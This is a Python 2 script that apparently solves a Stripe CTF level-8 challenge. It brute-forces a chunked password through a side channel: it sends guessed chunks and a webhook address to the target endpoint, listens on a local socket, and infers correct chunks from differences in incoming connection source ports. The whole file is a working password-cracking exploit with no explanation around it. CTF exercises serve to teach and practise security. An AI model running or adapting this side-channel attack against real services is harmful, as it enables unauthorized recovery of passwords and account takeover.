import os
import sys
import socket
import urllib
portno=50001
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", portno))
s.listen(1)
s.settimeout(2)

current_chunk = 0
pw_list = [ 'aaa', 'bbb', 'ccc', 'ddd' ]
while current_chunk != 3:
	# form pw
	fmt_pw = ""
	for i in xrange(4):
		if i == current_chunk:
			fmt_pw += '%03d'
		else:
			fmt_pw += pw_list[i]

	temp, port = [], -1
	for i in xrange(0,5):
		pw = fmt_pw % i
		try:
			urllib.urlopen('https://level08-4.stripe-ctf.com/user-lxulnzkywg/',
				'{"password": "baseline", "webhooks":["level02-2.stripe-ctf.com:%d"]}' % portno)
			s2,(host,port1) = s.accept()
			s2.close()
			urllib.urlopen('https://level08-4.stripe-ctf.com/user-lxulnzkywg/',
				'{"password": "' + pw + '", "webhooks":["level02-2.stripe-ctf.com:%d"]}' % portno)
			s2,(host,port2) = s.accept()
			s2.close()
			temp.append(abs(port1-port2))
		except socket.timeout:
			pass
	value = -1
	if temp.count(temp[0]) == len(temp):
		# all identical => all wrong
		# store incorrect value to look out for
		value = temp[0]
		print 'chunk %d - wrong value:'%current_chunk,value
	else:
		# found correct value
		value = temp.index([x for x in temp if x!=temp[0]][0])
		print 'chunk %d - correct value: %d' %(current_chunk,value)
		pw_list[current_chunk] = '%03d'%value
		print '1:pw_list:',pw_list
		current_chunk = current_chunk + 1
		continue

	candidate_list_1 = []
	candidate_list_2 = []
	while True:
		candidate_list_1 = []
		for i in xrange(5,1000):
			pw = fmt_pw % i
			try:
				urllib.urlopen('https://level08-4.stripe-ctf.com/user-lxulnzkywg/',
					'{"password": "baseline", "webhooks":["level02-2.stripe-ctf.com:%d"]}' % portno)
				s2,(host,port1) = s.accept()
				s2.close()
				urllib.urlopen('https://level08-4.stripe-ctf.com/user-lxulnzkywg/',
					'{"password": "' + pw + '", "webhooks":["level02-2.stripe-ctf.com:%d"]}' % portno)
				s2,(host,port2) = s.accept()
				s2.close()
				this_value = abs(port1-port2)
				if this_value != value:
					candidate_list_1.append(i)
			except socket.timeout:
				pass
		candidate_list_2 = []
		for i in xrange(5,1000):
			pw = fmt_pw % i
			try:
				urllib.urlopen('https://level08-4.stripe-ctf.com/user-lxulnzkywg/',
					'{"password": "baseline", "webhooks":["level02-2.stripe-ctf.com:%d"]}' % portno)
				s2,(host,port1) = s.accept()
				s2.close()
				urllib.urlopen('https://level08-4.stripe-ctf.com/user-lxulnzkywg/',
					'{"password": "' + pw + '", "webhooks":["level02-2.stripe-ctf.com:%d"]}' % portno)
				s2,(host,port2) = s.accept()
				s2.close()
				this_value = abs(port1-port2)
				if this_value != value:
					candidate_list_2.append(i)
			except socket.timeout:
				pass
		print candidate_list_1, candidate_list_2
		if len(list(set(candidate_list_1)&set(candidate_list_2))) == 1:
			break

	# success for this particular chunk
	correct_value = list(set(candidate_list_1) & set(candidate_list_2))[0]
	print 'correct! chunk %d: %d' %(current_chunk,correct_value)
	pw_list[current_chunk] = '%03d'%correct_value
	print '2:pw_list:',pw_list
	current_chunk = current_chunk + 1
